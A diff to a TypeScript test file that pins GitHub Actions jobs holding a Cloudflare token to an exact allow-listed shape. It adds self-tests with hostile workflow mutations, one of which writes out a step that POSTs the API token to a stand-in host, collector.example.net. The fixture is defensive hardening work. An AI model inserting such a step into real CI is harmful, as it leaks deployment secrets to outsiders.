@@ -129,24 +129,21 @@ function readCanonical(file: string, text: string): { errors: string[]; comments
 const CANONICAL = new Map([...WORKFLOWS].map(([file, text]) => [file, readCanonical(file, text)]));
 
 /** A workflow's lines without its YAML comments. Block-scalar lines stay, `#` or not: GitHub reads them. */
-const code = (file: string) =>
-  WORKFLOWS.get(file)!
-    .split('\n')
-    .filter((_line, i) => !CANONICAL.get(file)!.comments.has(i));
+const codeOf = (text: string, comments: Set<number>) => text.split('\n').filter((_line, i) => !comments.has(i));
+const code = (file: string) => codeOf(WORKFLOWS.get(file)!, CANONICAL.get(file)!.comments);
 /** The non-blank lines under `jobs:`. */
-const jobLines = (file: string) => {
-  const lines = code(file);
-  return lines.slice(lines.indexOf('jobs:') + 1).filter((line) => line.trim() !== '');
-};
+const jobLinesOf = (lines: string[]) => lines.slice(lines.indexOf('jobs:') + 1).filter((line) => line.trim() !== '');
+const jobLines = (file: string) => jobLinesOf(code(file));
 const JOB_KEY = /^ {2}[\w-]+:$/;
 
-/** A workflow's jobs by name, each the text of its block, split on the two-space job keys. */
-function jobBlocks(file: string): Map<string, string> {
-  const lines = jobLines(file);
+/** A workflow's jobs by name, each the text of its block, split on the two-space job keys. `text` is for the self-tests. */
+function jobBlocks(file: string, text = WORKFLOWS.get(file)!): Map<string, string> {
+  const canonical = readCanonical(file, text);
+  const lines = jobLinesOf(codeOf(text, canonical.comments));
   const starts = lines.flatMap((line, i) => (JOB_KEY.test(line) ? [i] : []));
   if (starts.length === 0) {
     // A file outside the subset (CRLF line endings, say) can hide every job: say why first.
-    const why = CANONICAL.get(file)!.errors.slice(0, 3);
+    const why = canonical.errors.slice(0, 3);
     throw new Error(`found no jobs in ${file}: has its layout changed?${why.length > 0 ? `\n${why.join('\n')}` : ''}`);
   }
   return new Map(starts.map((start, i) => [lines[start]!.trim().slice(0, -1), lines.slice(start, starts[i + 1]).join('\n')]));
@@ -295,6 +292,238 @@ const TOKEN_JOBS = {
   },
 };
 
+// ---------------------------------------------------------------------------------------------
+// The pin (Ruling 77). Each token job is exactly the job below: its keys, from an allow-list; its
+// steps, in order, each by its action at its SHA or its exact script; every `if`, `id`, `with`
+// and `env` value as written; and step keys from an allow-list. Only the names are free. So any
+// change to a token job, a Dependabot bump of one of its actions included, changes this pin too,
+// after review. `secrets` appears only on the HAS_CLOUDFLARE line and in wrangler-action's
+// apiToken and accountId.
+// ---------------------------------------------------------------------------------------------
+
+/** A value in the canonical subset: a scalar as written (a block scalar as its header and dedented lines), a sequence or a mapping. */
+type Yaml = string | Yaml[] | { [key: string]: Yaml };
+const isMapping = (value: Yaml | undefined): value is { [key: string]: Yaml } => typeof value === 'object' && !Array.isArray(value);
+
+const TOKEN_ACTIONS = {
+  checkout: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
+  setupNode: 'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1',
+  download: 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c',
+  githubScript: 'actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3',
+  wrangler: 'cloudflare/wrangler-action@953926a2e2182532811c01a25e53647d93bf07c0',
+};
+const TOKEN_JOB_KEYS = ['name', 'if', 'needs', 'runs-on', 'environment', 'permissions', 'env', 'steps'];
+const TOKEN_STEP_KEYS = ['name', 'id', 'if', 'uses', 'with', 'env', 'run'];
+const HAS_CLOUDFLARE = "${{ secrets.CLOUDFLARE_API_TOKEN != '' }}";
+const WRANGLER_VERSION_OUTPUT = '${{ steps.trusted.outputs.wrangler-version }}';
+const literal = (text: string) => `|\n${text}`;
+const folded = (...lines: string[]) => ['>-', ...lines].join('\n');
+const previewGate = (action: string) =>
+  folded(
+    "vars.CI_PREVIEWS == 'true' &&",
+    `github.event_name == 'pull_request' && github.event.action ${action} &&`,
+    'github.event.pull_request.head.repo.full_name == github.repository &&',
+    'github.event.pull_request.base.ref == github.event.repository.default_branch',
+  );
+const notice = (title: string, text: string) => ({ if: "env.HAS_CLOUDFLARE != 'true'", run: `echo "::notice title=${title} skipped::${text}"` });
+const enabled = (step: { [key: string]: Yaml }) => ({ if: ENABLED, ...step });
+const trustedSteps = (ref: string) => [
+  enabled({
+    uses: TOKEN_ACTIONS.checkout,
+    with: { ref, path: 'trusted', 'sparse-checkout': literal(TRUSTED_FILES.join('\n')), 'sparse-checkout-cone-mode': 'false', 'persist-credentials': 'false' },
+  }),
+  enabled({ uses: TOKEN_ACTIONS.setupNode, with: { 'node-version-file': 'trusted/.nvmrc', 'package-manager-cache': 'false' } }),
+  enabled({ id: 'trusted', run: TRUSTED_CONFIG }),
+  enabled({ env: { WRANGLER_VERSION: WRANGLER_VERSION_OUTPUT }, run: VERSION_CHECK }),
+  enabled({ run: literal(FLOOR_CHECK) }),
+];
+const siteSteps = (builder: string) => {
+  const id = `\${{ needs.${builder}.outputs.site-artifact-id }}`;
+  return [
+    enabled({ env: { ARTIFACT_ID: id }, run: ID_CHECK }),
+    enabled({ uses: TOKEN_ACTIONS.download, with: { 'artifact-ids': id, path: '${{ runner.temp }}/artifact' } }),
+    enabled({ run: literal(COPY_SITE) }),
+  ];
+};
+const wranglerStep = (command: string, id?: string) =>
+  enabled({
+    ...(id ? { id } : {}),
+    uses: TOKEN_ACTIONS.wrangler,
+    env: { npm_config_ignore_scripts: "'true'", npm_config_min_release_age: `'${COOLDOWN_DAYS[0]}'` },
+    with: {
+      apiToken: '${{ secrets.CLOUDFLARE_API_TOKEN }}',
+      accountId: '${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
+      wranglerVersion: WRANGLER_VERSION_OUTPUT,
+      workingDirectory: SITE,
+      command,
+    },
+  });
+const PREVIEW_COMMENT = [
+  "const marker = '<!-- cloudflare-site-template:preview -->';",
+  'const sha = context.payload.pull_request.head.sha.slice(0, 7);',
+  'const body = [',
+  '  marker,',
+  '  `**Preview:** ${process.env.PREVIEW_URL}`,',
+  "  '',",
+  "  `Built from ${sha} with Turnstile's test keys and \\`log\\` delivery: the form works and sends nothing.`,",
+  "].join('\\n');",
+  'const { owner, repo } = context.repo;',
+  'const issue_number = context.payload.pull_request.number;',
+  'const comments = await github.paginate(github.rest.issues.listComments, { owner, repo, issue_number });',
+  "const mine = comments.find((comment) => comment.user?.type === 'Bot' && comment.body?.startsWith(marker));",
+  'if (mine) await github.rest.issues.updateComment({ owner, repo, comment_id: mine.id, body });',
+  'else await github.rest.issues.createComment({ owner, repo, issue_number, body });',
+].join('\n');
+const SECRETS_IN = 'CLOUDFLARE_API_TOKEN and CLOUDFLARE_ACCOUNT_ID secrets in the';
+
+const TOKEN_JOB_SHAPES: Record<keyof typeof TOKEN_JOBS, { [key: string]: Yaml }> = {
+  'ci.yml:deploy': {
+    if: "github.event_name == 'push' && github.ref == 'refs/heads/main'",
+    needs: ['verify', 'e2e'],
+    'runs-on': 'ubuntu-latest',
+    environment: 'production',
+    env: { HAS_CLOUDFLARE },
+    steps: [
+      notice('Deploy', `Set the ${SECRETS_IN} production environment (or as repository secrets, on a private GitHub Free repository) to deploy from CI.`),
+      ...trustedSteps(TOKEN_JOBS['ci.yml:deploy'].ref),
+      ...siteSteps('verify'),
+      wranglerStep(TOKEN_JOBS['ci.yml:deploy'].command),
+    ],
+  },
+  'ci.yml:preview': {
+    if: previewGate("!= 'closed'"),
+    needs: 'preview-build',
+    'runs-on': 'ubuntu-latest',
+    environment: 'preview',
+    permissions: { contents: 'read', 'pull-requests': 'write' },
+    env: { HAS_CLOUDFLARE },
+    steps: [
+      notice('Preview', `Set the ${SECRETS_IN} preview environment, behind required reviewers, to get a preview per pull request. Repository secrets reach this job too, unreviewed.`),
+      ...trustedSteps(TOKEN_JOBS['ci.yml:preview'].ref),
+      ...siteSteps('preview-build'),
+      wranglerStep(TOKEN_JOBS['ci.yml:preview'].command, 'preview'),
+      enabled({ uses: TOKEN_ACTIONS.githubScript, env: { PREVIEW_URL: '${{ steps.preview.outputs.preview-url }}' }, with: { script: literal(PREVIEW_COMMENT) } }),
+    ],
+  },
+  'ci.yml:preview-cleanup': {
+    if: previewGate("== 'closed'"),
+    'runs-on': 'ubuntu-latest',
+    environment: 'preview',
+    env: { HAS_CLOUDFLARE },
+    steps: [...trustedSteps(TOKEN_JOBS['ci.yml:preview-cleanup'].ref), enabled({ run: literal(COPY_CONFIG) }), wranglerStep(TOKEN_JOBS['ci.yml:preview-cleanup'].command)],
+  },
+};
+
+/**
+ * Reads lines in the canonical subset, without comments or blank lines, into values: a plain
+ * scalar without its comment, a quoted one as written, a block scalar as its header line and its
+ * lines dedented. Mappings have no prototype, so no key (`__proto__` included) can hide. `rest` is
+ * whatever it could not place.
+ */
+function readYaml(input: string[]): { value: Yaml; rest: string[] } {
+  const lines = [...input];
+  let i = 0;
+  const scalar = (raw: string, column: number): Yaml => {
+    if (raw === '') return node(column + 2);
+    if (BLOCK_SCALAR.test(raw)) {
+      const body: string[] = [];
+      while (i < lines.length && indentOf(lines[i]!) > column) body.push(lines[i++]!);
+      const by = body.length > 0 ? indentOf(body[0]!) : 0;
+      return [raw, ...body.map((line) => line.slice(by))].join('\n');
+    }
+    return /^(?:'(?:[^']|'')*'|"[^"]*")/.exec(raw)?.[0] ?? raw.replace(/ +#.*$/, '');
+  };
+  const node = (indent: number): Yaml => {
+    if (i >= lines.length || indentOf(lines[i]!) !== indent) return '';
+    if (lines[i]!.startsWith('- ', indent)) {
+      const items: Yaml[] = [];
+      while (i < lines.length && indentOf(lines[i]!) === indent && lines[i]!.startsWith('- ', indent)) {
+        const item = lines[i]!.slice(indent + 2);
+        if (KEY.test(item)) {
+          // `- key: value` opens a mapping two columns in: read it there.
+          lines[i] = `${' '.repeat(indent + 2)}${item}`;
+          items.push(node(indent + 2));
+        } else {
+          i++;
+          items.push(scalar(item, indent));
+        }
+      }
+      return items;
+    }
+    const map: { [key: string]: Yaml } = Object.create(null);
+    while (i < lines.length && indentOf(lines[i]!) === indent) {
+      const entry = KEY.exec(lines[i]!.slice(indent));
+      if (!entry) break;
+      i++;
+      map[entry[1]!] = scalar(entry[2] ?? '', indent);
+    }
+    return map;
+  };
+  const value = node(lines.length > 0 ? indentOf(lines[0]!) : 0);
+  return { value, rest: lines.slice(i) };
+}
+
+/** JSON with every mapping's keys sorted, so two values compare as text. */
+const stable = (value: Yaml | undefined) =>
+  JSON.stringify(value, (_key, inner: unknown) =>
+    inner && typeof inner === 'object' && !Array.isArray(inner) ? Object.fromEntries(Object.entries(inner).sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0))) : inner,
+  ) ?? '(none)';
+const unnamed = (value: Yaml | undefined) => (isMapping(value) ? Object.fromEntries(Object.entries(value).filter(([key]) => key !== 'name')) : value);
+/** `step 3: with.apiToken`, or `env.HAS_CLOUDFLARE`: a place in a job, steps counted from one as GitHub shows them. */
+const place = (path: string[]) => (path[0] === 'steps' && path.length > 1 ? `step ${Number(path[1]) + 1}: ${path.slice(2).join('.')}` : path.join('.'));
+/**
+ * Where a job names secrets, in any form, by place: every key that does, and every scalar that does
+ * in an expression, which starts at its first `${{`, or is the whole of an `if`. The skip notices
+ * say "secrets" in prose, outside any expression.
+ */
+function secretPlaces(value: Yaml, path: string[] = []): string[] {
+  if (typeof value === 'string') {
+    const at = value.indexOf('${{');
+    const expression = path.at(-1) === 'if' ? value : at === -1 ? '' : value.slice(at);
+    return /\bsecrets\b/i.test(expression) ? [place(path)] : [];
+  }
+  const entries = Array.isArray(value) ? value.map((item, i) => [String(i), item] as const) : Object.entries(value);
+  return entries.flatMap(([key, inner]) => [...(/\bsecrets\b/i.test(key) ? [place([...path, key])] : []), ...secretPlaces(inner, [...path, key])]);
+}
+
+/** What makes a token job other than its pin: unknown keys, `secrets` out of place, and any other difference. */
+function tokenJobProblems(name: keyof typeof TOKEN_JOBS, block: string): { keys: string[]; secrets: string[]; shape: string[] } {
+  const pinned = TOKEN_JOB_SHAPES[name];
+  const { value, rest } = readYaml(block.split('\n').slice(1));
+  const job = isMapping(value) ? value : {};
+  const steps = Array.isArray(job.steps) ? job.steps : [];
+  const pinnedSteps = pinned.steps as Yaml[];
+
+  const keys = [
+    ...Object.keys(job).flatMap((key) => (TOKEN_JOB_KEYS.includes(key) ? [] : [`job key "${key}" is not one a token job may have`])),
+    ...steps.flatMap((step, i) =>
+      Object.keys(isMapping(step) ? step : {}).flatMap((key) => (TOKEN_STEP_KEYS.includes(key) ? [] : [`step ${i + 1}: "${key}" is not a key a token job's step may have`])),
+    ),
+  ];
+
+  // The reader places every line, or the shape check below says so, so this sees every key and value.
+  const wrangler = steps.findIndex((step) => isMapping(step) && step.uses === TOKEN_ACTIONS.wrangler);
+  const allowed = ['env.HAS_CLOUDFLARE', ...(wrangler === -1 ? [] : ['apiToken', 'accountId'].map((input) => `step ${wrangler + 1}: with.${input}`))];
+  const secrets = secretPlaces(job).flatMap((at) => (allowed.includes(at) ? [] : [`${at} names secrets`]));
+
+  const shape = [
+    ...(rest.length > 0 ? [`lines the pin cannot place, from: ${rest[0]!.trim()}`] : []),
+    ...Object.keys({ ...job, ...pinned })
+      .filter((key) => key !== 'name' && key !== 'steps' && stable(job[key]) !== stable(pinned[key]))
+      .map((key) => `job ${key}: ${stable(job[key])}, but the pin is ${stable(pinned[key])}`),
+    ...(steps.length === pinnedSteps.length ? [] : [`${steps.length} steps, but the pin has ${pinnedSteps.length}`]),
+    ...Array.from({ length: Math.max(steps.length, pinnedSteps.length) }, (_, i) => {
+      const [actual, want] = [unnamed(steps[i]), pinnedSteps[i]];
+      if (stable(actual) === stable(want)) return [];
+      // A Dependabot bump moves an action's SHA: name it, so the pin moves with it once the new commit is checked.
+      const [uses, pin] = [isMapping(actual) ? actual.uses : undefined, isMapping(want) ? want.uses : undefined];
+      const bumped = typeof uses === 'string' && typeof pin === 'string' && uses !== pin && uses.split('@')[0] === pin.split('@')[0];
+      return [`step ${i + 1}: ${stable(actual)}, but the pin is ${stable(want)}${bumped ? ` (a new SHA for ${pin.split('@')[0]}: check that commit, then move TOKEN_ACTIONS)` : ''}`];
+    }).flat(),
+  ];
+  return { keys, secrets, shape };
+}
+
 describe.each([...WORKFLOWS.keys()])('%s', (file) => {
   test('is written in the canonical block-YAML subset', () => {
     expect(CANONICAL.get(file)!.errors).toEqual([]);
@@ -371,6 +600,7 @@ describe.each(Object.entries(TOKEN_JOBS))('the %s job, which holds the token', (
   });
   const at = (predicate: (step: string) => boolean) => all.findIndex(predicate);
   const wranglers = find('cloudflare/wrangler-action');
+  const problems = tokenJobProblems(name as keyof typeof TOKEN_JOBS, block);
 
   test(`runs through the ${expected.environment} environment, on a GitHub-hosted runner`, () => {
     expect(block).toContain(`\n    environment: ${expected.environment}\n`);
@@ -384,6 +614,19 @@ describe.each(Object.entries(TOKEN_JOBS))('the %s job, which holds the token', (
     const allowed = [TRUSTED_CONFIG, VERSION_CHECK, FLOOR_CHECK, ...(expected.builder ? [ID_CHECK, COPY_SITE] : [COPY_CONFIG])];
     for (const script of runs) expect(allowed.includes(script) || NOTICE.test(script), script).toBe(true);
     for (const script of allowed) expect(runs, script).toContain(script);
+  });
+
+  // Ruling 77: an allow-list, where the test below is a deny-list.
+  test('has only the job keys and step keys a token job may have', () => {
+    expect(problems.keys).toEqual([]);
+  });
+
+  test("names secrets only on the HAS_CLOUDFLARE line and in wrangler-action's apiToken and accountId", () => {
+    expect(problems.secrets).toEqual([]);
+  });
+
+  test('is exactly the pinned job: each step in order, by its action and SHA or its script, and every value but the names', () => {
+    expect(problems.shape).toEqual([]);
   });
 
   test('has no container, services, strategy, shell, working-directory, defaults, outputs or continue-on-error', () => {
@@ -564,4 +807,63 @@ describe('the canonical reader', () => {
     'refuses %s with a value on its own line',
     (key) => expect(errors(`${ok}        ${key}: \${{ fromJSON('{}') }}\n`).join('\n')).toContain(`"${key}" ${MAPPING}`),
   );
+});
+
+// The pin, on the final review's mutations of ci.yml. Each is in the canonical subset, and each
+// passed every test before Ruling 77.
+describe('the token-job pin', () => {
+  const ci = WORKFLOWS.get('ci.yml')!;
+  /** ci.yml with `old` replaced in one job's block, where it must occur exactly once. */
+  const inJob = (text: string, job: string, old: string, replacement: string) => {
+    const start = text.indexOf(`\n  ${job}:\n`);
+    const end = start + 2 + text.slice(start + 2).search(/\n {2}\S/);
+    const block = text.slice(start, end);
+    expect(block.split(old), `${job}: ${old}`).toHaveLength(2);
+    return text.slice(0, start) + block.replace(old, () => replacement) + text.slice(end);
+  };
+  const problemsOf = (text: string, name: keyof typeof TOKEN_JOBS) => {
+    expect(readCanonical('ci.yml', text).errors).toEqual([]);
+    return tokenJobProblems(name, jobBlocks('ci.yml', text).get(name.slice('ci.yml:'.length)) ?? '');
+  };
+  const TRUSTED_STEP = `        id: trusted\n        if: ${ENABLED}\n`;
+  const VERSION_STEP = `      - name: Stop unless a wrangler version was read\n        if: ${ENABLED}\n`;
+  const WRANGLER = `      - if: ${ENABLED}\n        uses: cloudflare/wrangler-action@`;
+
+  test('passes ci.yml as it is', () => {
+    for (const name of Object.keys(TOKEN_JOBS) as (keyof typeof TOKEN_JOBS)[]) expect(problemsOf(ci, name), name).toEqual({ keys: [], secrets: [], shape: [] });
+  });
+
+  // (a) GitHub has run background steps since 2026-06-25: the job moves on without waiting, so the
+  // "Stop unless" guards no longer stand before wrangler.
+  test("refuses (a): background: true on deploy's trusted-config and version-check steps", () => {
+    let text = inJob(ci, 'deploy', TRUSTED_STEP, `${TRUSTED_STEP}        background: true\n`);
+    text = inJob(text, 'deploy', VERSION_STEP, `${VERSION_STEP}        background: true\n`);
+    const { keys, shape } = problemsOf(text, 'ci.yml:deploy');
+    expect(keys).toEqual(['step 4: "background" is not a key a token job\'s step may have', 'step 5: "background" is not a key a token job\'s step may have']);
+    expect(shape.join('\n')).toContain('step 4: ');
+  });
+
+  test('refuses (b): a github-script step in deploy that posts the token to another host', () => {
+    const step = [
+      '      - name: Report the deploy',
+      `        if: ${ENABLED}`,
+      `        uses: ${TOKEN_ACTIONS.githubScript} # v9.0.0`,
+      '        with:',
+      '          script: |',
+      "            await fetch('https://collector.example.net/', { method: 'POST', body: '${{ secrets.CLOUDFLARE_API_TOKEN }}' });",
+      '',
+    ].join('\n');
+    const { secrets, shape } = problemsOf(inJob(ci, 'deploy', WRANGLER, step + WRANGLER), 'ci.yml:deploy');
+    expect(secrets).toEqual(['step 10: with.script names secrets']);
+    expect(shape).toContain('11 steps, but the pin has 10');
+  });
+
+  test('refuses (c): PREVIEW_URL set to the token, which the comment step would post on the pull request', () => {
+    const { secrets, shape } = problemsOf(
+      inJob(ci, 'preview', 'PREVIEW_URL: ${{ steps.preview.outputs.preview-url }}', 'PREVIEW_URL: ${{ secrets.CLOUDFLARE_API_TOKEN }}'),
+      'ci.yml:preview',
+    );
+    expect(secrets).toEqual(['step 11: env.PREVIEW_URL names secrets']);
+    expect(shape.join('\n')).toContain('step 11: ');
+  });
 });
